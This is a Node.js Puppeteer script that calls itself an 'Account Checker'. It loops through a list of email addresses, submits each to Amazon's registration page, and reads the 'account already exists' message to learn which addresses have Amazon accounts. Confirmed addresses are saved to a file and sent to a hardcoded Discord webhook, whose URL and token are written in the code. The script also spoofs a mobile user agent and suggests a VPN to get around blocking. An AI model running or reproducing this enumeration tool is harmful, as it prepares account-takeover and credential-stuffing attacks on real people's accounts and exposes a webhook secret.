const puppeteer = require('puppeteer');
const fs = require('fs');
const readline = require('readline');
const clipboardy = require('clipboardy');
var Transform = require('stream').Transform;
var util = require('util');
const {
    Webhook,
    MessageBuilder
} = require('discord-webhook-node');
const rpc = require("discord-rpc");
const client = new rpc.Client({
    transport: 'ipc'
});
var amznLink = "https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
var emailTable = []
const setTitle = require('node-bash-title');
setTitle('Account Checker by aaronmansfield5#6864');
let hooklink = "https://discord.com/api/webhooks/915448815887220758/AaP-QzQR24wYVWmjjxYsAfE2XP4v49JsEEVeSCfmjZvk6I-bg6prLGTPvX9E5l0hBvKp"

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function arrMail(data) {
    const arr = data.toString().replace(/\r\n/g, '\n').split('\n');

    for (let i of arr) {
        if (i != "EmailAddress") {
            emailTable[emailTable.length] = i
        }
    }
};

function getRndInteger(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

async function start() {
    console.log("Launching Chromium...")
    let validAm = 0

    client.login({
        clientId: "902737456686825523"
    }).catch(console.log("There was a timeout error whilst setting your Discord status, either reload Discord or the checker! Attempting to re-restablish connection."));

    client.on("ready", () => {
        console.log(`Success! Launching Discord RPC now!`)
        client.request('SET_ACTIVITY', {
            pid: process.pid,
            activity: {
                details: "Checking Accounts",
                state: `Loading list of emails!`,
                assets: {
                    large_image: "large_image",
                    large_text: "Made by aaronmansfield5#6864"
                },
                buttons: [{
                    label: "Join the Discord!",
                    url: "https://discord.gg/Q7fW7nQHW9"
                }],
                instance: true
            }
        })
    })
    await sleep(1500)
    var data = fs.readFileSync('./elements/emails.txt', {
        encoding: 'utf8',
        flag: 'r'
    });
    await arrMail(data, (err) => {
        if (err) throw err;
    });

    async function isVisible(page, xPathSelector) {
        try {
            await page.waitForXPath(xPathSelector, {
                visible: true,
                timeout: 1000
            });
            return true;
        } catch {
            return false;
        }
    }

    async function removeone() {
        fs.readFile('./elements/emails.txt', (err, data) => {
            if (err) {
                throw err;
            }

            let fileRows = data.toString().split('\n');

            let firstRow = fileRows.shift();

            fileRows.push(firstRow);

            const fileData = new Uint8Array(Buffer.from(fileRows.join('\n')));

            fs.writeFile('./elements/emails.txt', fileData, (err) => {
                if (err) {
                    throw err;
                }

            });

        });
    }

    const browser = await puppeteer.launch({
        headless: true,
        ignoreHTTPSErrors: true
    });
    browser.currentPage = async function (browser, timeout) {
        var start = new Date().getTime();
        while (new Date().getTime() - start < timeout) {
            var pages = await browser.pages();
            var arr = [];
            for (const p of pages) {
                if (await p.evaluate(() => {
                        return document.visibilityState == 'visible'
                    })) {
                    arr.push(p);
                }
            }
            if (arr.length == 1) return arr[0];
        }
        throw "Unable to get active page";
    }
    var page = await browser.currentPage(browser, 1000, (err) => {
        if (err) throw err;
    });
    await page.setUserAgent('Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30')
    try {
        await page.goto(amznLink)
    } catch (error) {
        console.log(`There was an error, please restart the program. If this continues please attempt to enter the amazon sign-up site, if it displays an error then use a VPN for a few hours! ${error}`)
    }
    console.log("Chromium launched successfully! Starting Loop.")
    await sleep(1000)
    console.clear()
    console.log("If nothing appears on the console in > 5 seconds to load then please restart!")
    let checked = null
    for (let i = 0; i => emailTable.length; i++) {
        await page.goto(amznLink)
        try {
            await page.waitForSelector('input[name=email]')
            await page.waitForSelector('input[name=customerName]')
            await page.waitForSelector('input[name=password]')
            await page.type('input[name=customerName]', "aaronmansfield5#6864")
            await page.type('input[name=email]', emailTable[i].toLowerCase())
            await page.type('input[name=password]', "password")
            await page.waitForSelector('input[id=continue]')
            await page.click('input[id=continue]')
            await sleep(750)
            try {
                const [getXpath] = await page.$x('/html/body/div[1]/div[2]/div[2]/div/div/div/ul/li/span')
                if (await page.$x('/html/body/div[1]/div[2]/div[2]/div/div/div/ul/li/span', {
                        timeout: 1000
                    })) {
                    if (await isVisible(page, "/html/body/div[1]/div[2]/div[2]/div/div/div/ul/li/span")) {
                        const message = await page.evaluate(name => name.textContent, getXpath);
                        if (message == ("\n            You indicated you're a new customer, but an account already exists with the email address " + emailTable[i].toLowerCase() + ".\n          ")) {
                            try {
                                let spl = emailTable[getRndInteger(1,emailTable.length)].split('@')
                                client.request('SET_ACTIVITY', {
                                    pid: process.pid,
                                    activity: {
                                        details: "Checking Accounts",
                                        state: `Checked ${i} of ${emailTable.length} emails.`,
                                        assets: {
                                            large_image: "large_image",
                                            large_text: "Made by aaronmansfield5#6864",
                                            small_image: "valid",
                                            small_text: "Valid Email",
                                        },
                                        buttons: [
                                        {
                                            label: "Join the Discord!",
                                            url: "https://discord.gg/Q7fW7nQHW9"
                                        },
                                        {
                                            label: "Get a random mailbox!",
                                            url: `http://www.fakemailgenerator.com/#/${spl[1]}/${spl[0]}/`
                                        }],
                                        instance: true
                                    }
                                })
                            }
                            catch (discErr) {
                                console.log("There was a timeout error whilst setting your Discord status, either reload Discord or the checker!")
                                continue
                            }
                            validAm ++
                            console.log(`Valid Mail. Sent to Discord Webhook! Hit over ${validAm} mails!`)
                            checked = true
                            let hook = new Webhook(hooklink)
                            let split = emailTable[i].split('@')
                            let embed = new MessageBuilder()
                                .setTitle('Valid Account found!')
                                .addField('Email Address', emailTable[i])
                                .addField('Mail Box', `[Click Me](http://www.fakemailgenerator.com/#/${split[1]}/${split[0]}/)`)
                            hook.send(embed)
                            await fs.appendFile('./elements/valid_emails.txt', emailTable[i] + '\n', (err) => {
                                if (err) throw err;
                            });
                            await removeone()
                        } else {
                            try {
                                let spl = emailTable[getRndInteger(1,emailTable.length)].split('@')
                                client.request('SET_ACTIVITY', {
                                    pid: process.pid,
                                    activity: {
                                        details: "Checking Accounts",
                                        state: `Checked ${i} of ${emailTable.length} emails.`,
                                        assets: {
                                            large_image: "large_image",
                                            large_text: "Made by aaronmansfield5#6864",
                                            small_image: "invalid",
                                            small_text: "Invalid email",
                                        },
                                        buttons: [
                                        {
                                            label: "Join the Discord!",
                                            url: "https://discord.gg/Q7fW7nQHW9"
                                        },
                                        {
                                            label: "Get a random mailbox!",
                                            url: `http://www.fakemailgenerator.com/#/${spl[1]}/${spl[0]}/`
                                        }
                                    ],
                                        instance: true
                                    }
                                })
                            }
                            catch (discErr) {
                                console.log("There was a timeout error whilst setting your Discord status, either reload Discord or the checker!")
                                continue
                            }
                            console.log('Invalid Mail!')
                            checked = true
                            await removeone()
                        }
                    }
                }
            } catch (error) {
                console.log("An execution error was experienced, most likely due to your Wi-Fi speed!")
                continue
            }
        } catch (err) {
            console.log("An execution error was experienced, most likely due to your Wi-Fi speed!")
            continue
        }
        if(checked == null) {
            console.log(`There was an error, please restart the program. If this continues please attempt to enter the amazon sign-up site, if it displays an error then use a VPN for a few hours!`)
            break;
        }
        setTitle(`Account Checker by aaronmansfield5#6864 ${i}/${emailTable.length}`);
    }
    process.exit()
}

console.clear()
start()